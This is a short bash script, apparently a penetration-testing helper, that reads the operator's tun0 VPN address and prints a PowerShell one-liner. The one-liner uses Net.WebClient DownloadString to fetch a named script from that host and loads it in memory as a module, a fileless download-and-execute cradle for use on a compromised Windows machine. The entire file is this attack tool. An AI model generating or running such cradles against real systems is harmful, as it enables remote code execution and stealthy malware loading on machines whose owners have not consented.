#!/bin/bash

if [ "$#" -ne 1 ]; then
    printf '%s <modulename>' "$0" 1>&2
    exit 1
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf 'New-Module -Name "%s" -ScriptBlock ([Scriptblock]::Create((New-Object Net.WebClient).DownloadString("http://%s/%s")))' "$(printf '%s' "$1" | sed -E 's/\..+$//')" "$ip" "$1"
